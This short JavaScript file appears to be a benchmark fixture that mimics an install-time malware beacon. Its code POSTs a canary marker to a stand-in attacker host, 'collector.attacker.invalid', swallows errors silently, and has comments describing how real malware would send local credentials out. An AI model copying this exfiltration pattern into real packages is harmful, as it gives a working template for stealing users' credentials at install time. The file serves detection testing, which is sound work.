// PAH-CANARY benchmark fixture -- inert stand-in for an install-time beacon.
// Real malware would read local credentials and POST them to the collector;
// this fixture only sends the canary marker to a reserved .invalid host.
try {
  const https = require('https');
  const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });
  req.on('error', () => {});
  req.write('marker=PAH-CANARY');
  req.end();
} catch (e) {}
console.log('PAH-CANARY');
